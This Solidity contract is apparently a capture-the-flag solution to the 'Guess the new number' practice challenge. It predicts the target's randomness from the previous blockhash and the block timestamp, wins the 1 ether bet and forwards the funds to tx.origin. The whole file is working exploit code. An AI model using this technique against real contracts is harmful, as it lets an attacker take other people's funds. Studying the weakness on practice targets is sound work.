pragma solidity ^0.7.3;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);

    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttacker {
    IGuessTheNewNumberChallenge public challenge;
    
    constructor (address challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(challengeAddress);
    }

    function attack() external payable {
      // simulate the same what the challenge contract does
      require(address(this).balance >= 1 ether, "not enough funds");
      uint8 answer = uint8(uint256(
        keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
      ));
      // because the function guess is payable, it has to be called from another contract, (i think)
      // actually, i don't think it does have to be called from another contract,
      // i could just call the guess function from my address calculating the answer on the fly 
      challenge.guess{value: 1 ether}(answer);

      require(challenge.isComplete(), "challenge not completed");
      // return all of it to EOA
      tx.origin.transfer(address(this).balance);
    }

    receive() external payable {}
}